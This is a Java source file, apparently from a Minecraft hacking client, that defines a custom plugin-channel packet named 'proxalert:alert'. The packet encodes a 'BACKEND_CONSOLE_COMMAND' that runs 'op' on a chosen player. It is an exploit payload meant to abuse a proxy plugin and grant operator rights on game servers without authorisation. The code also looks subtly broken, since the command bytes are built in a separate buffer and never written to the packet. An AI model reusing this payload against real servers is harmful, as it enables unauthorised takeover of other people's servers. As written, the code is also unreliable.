package io.github.spigotrce.paradiseclientfabric.packet;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

public record ProxAlertPayloadPacket(String s) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, ProxAlertPayloadPacket> CODEC = CustomPayload.codecOf(ProxAlertPayloadPacket::write, ProxAlertPayloadPacket::new);
    public static final CustomPayload.Id<ProxAlertPayloadPacket> ID = new CustomPayload.Id<>(Identifier.of("proxalert", "alert"));

    private ProxAlertPayloadPacket(PacketByteBuf buf) {
        this(buf.readString());
    }

    private void write(PacketByteBuf buf) {
        ByteArrayDataOutput out = ByteStreams.newDataOutput();
        out.writeUTF("BACKEND_CONSOLE_COMMAND");
        out.writeUTF("op");
        out.writeUTF(s);
    }

    public CustomPayload.Id<ProxAlertPayloadPacket> getId() {
        return ID;
    }
    @Override
    public boolean equals(Object obj) {
        return false;
    }

    @Override
    public int hashCode() {
        return 0;
    }

    @Override
    public String toString() {
        return "psab-spammer";
    }
}
